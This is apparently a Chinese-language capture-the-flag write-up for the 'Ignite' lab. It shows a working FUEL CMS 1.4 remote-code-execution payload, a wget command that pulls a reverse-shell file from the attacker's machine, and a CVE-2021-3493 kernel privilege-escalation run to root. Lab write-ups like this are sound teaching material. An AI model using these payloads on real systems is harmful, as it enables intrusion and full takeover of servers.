# Ignite


循例 nmap

只开80，直接访问，好家伙  FUEL CMS 1.4

之前某道题做过，存在rce的

    searchsploit FUEL CMS

exploit:

    view-source:http://10.10.115.191/fuel/pages/select/?filter='%2bpi(print(%24a%3d'system'))%2b%24a('whoami')%2b'

结果回显在网页源代码

尝试直接反弹shell，各种payload都不行

打算通过http将reverseshell的payload上传过去，再直接运行

攻击机创建好payload并打开http

    python3 -m http.server


'%2bpi(print(%24a%3d'system'))%2b%24a('wget http://10.11.17.14:8000/my_exp/rev_she11.php')%2b'

'%2bpi(print(%24a%3d'system'))%2b%24a('php ./rev_she11.php')%2b'

成功getshell

进去后查看系统版本为ubuntu 16.04且gcc命令正常，尝试CVE-2021-3943

<pre>www-data@ubuntu:/var/www/html$ gcc -o ./getroot ./CVE-2021-3493_overlay_fs_ubuntu_14~04_and_16~04_and_18~04_and_20~04_LTS.c

www-data@ubuntu:/var/www/html$ chmod 777 ./getroot
chmod 777 ./getroot
www-data@ubuntu:/var/www/html$ ./getroot
./getroot
bash-4.3# whoami
whoami
root
</pre>

游戏结束


我看了一下别人的writeup，别人是通过fuel的database.php获得root的密码

感觉我这个有点非预期，谁让这个cve这么猛呢，简直是通杀般的存在
